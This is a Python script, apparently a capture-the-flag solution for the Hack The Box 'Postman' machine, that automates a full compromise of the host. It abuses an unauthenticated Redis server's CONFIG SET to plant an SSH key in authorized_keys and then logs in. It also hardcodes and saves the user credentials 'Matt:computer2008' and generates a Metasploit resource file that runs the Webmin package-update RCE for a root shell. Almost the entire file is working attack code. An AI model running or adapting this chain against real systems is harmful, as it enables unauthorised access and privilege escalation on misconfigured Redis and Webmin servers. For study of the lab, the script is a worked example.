#!/usr/bin/python
# -*- coding: utf-8 -*-
import redis
import os,sys
import time
import subprocess 



      
ban = ("\n+++++++++++++++++++++++++++++++++\n"
         "+              By                +\n"
         "+         Abdallah Fouad         +\n"
         "+       automated exploit        +\n"
         "+              for               +\n"
         "+         Postman Machine        +\n"
         "+++++++++++++++++++++++++++++++++\n")
print(ban)


def main():
           p = raw_input("[+] Insert Your SSH Folder Path: ")
           path = os.path.join(os.getcwd(), p)
           if os.path.isdir(p):

              try:
                  conn = redis.StrictRedis(host='10.10.10.160',port=6379,db='')
                  print ("[+] Trying To Connect To Target..............[Done]")
                  conn.ping()
                  print ("[+]..................................... Connected!")
                  print ("[+] Sending info command.....................[Done]")
                  print ("Set Record:"), conn.execute_command("info")
                  print ("Set Record:"), conn.execute_command("config get *")
                  print ("Set SSH PATH:"),conn.execute_command("config set dir /var/lib/redis/.ssh ")
                  print ("Set Record:"), conn.execute_command("config set dbfilename authorized_keys")
                  print ("Set Record:"), conn.execute_command("save")
                  print ("Set Record:"), conn.execute_command("quit")
                  print ("[+] Session Closed From Redis Server .........[Done]")
                  print ("[+] Start To Creat SSH Key ...................[Done]")
                  os.system("ssh-keygen -t rsa")
                  print ("[+] Going To SSH DIR .........................[Done]")
                  os.chdir(path)
                  print ("[+] Locate id_rsa To inject ..................[Done]")
              	  os.system('(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > foo.txt')
              	  print ("[+] Inject RSA Key ...........................[Done]")
              	  os.system("cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit")
              	  print ("[+] Get Crackit Key From The Box:"), conn.execute_command("get crackit")
                  print ("[+] Start SSH Connection ...................... [Done]")
                  print ("[+] Go to /opt Path In Machine you will Find SSh Key  ")
                  print ("[+] Input Su Matt : pass :computer2008 .........[Start]")
                  time.sleep(5)
                  command = "ssh -i " + path+"/id_rsa redis@10.10.10.160"
                  os.system(command)
                  print ("[+] Save User Creds ............................[Done]")
                  f = open("User.txt","w")
                  f.write("UserName:Password\n")
	          f.write("Matt:computer2008")                 
                  f.close()
                  print ("[+] Check Your " + path + " For The Output txt ")
                  print ("[+] Root Shell Generation ......................[Done]")
                  file = open("Root.rc","w")
	          file.write("use exploit/linux/http/webmin_packageup_rce\n")
	          file.write("set RHOSTS 10.10.10.160\n")
	          file.write("set USERNAME Matt\n")
	          file.write("set PASSWORD computer2008\n")
	          file.write("set LHOST tun0\n")
	          file.write("set SSL True\n")  
	          file.write("run\n")
	          file.close()
	          time.sleep(3)
	          print ("[+] Now The Root Shell Start ..................[Done]")
                  os.system("sudo msfconsole -r Root.rc")
              except Exception as ex:
                  print ("Error:"), ex
                  exit('Failed to connect, terminating.')
           else:
                exit("[+] Dir Can not Found .......................[Exit]")
if __name__=="__main__":
    main()

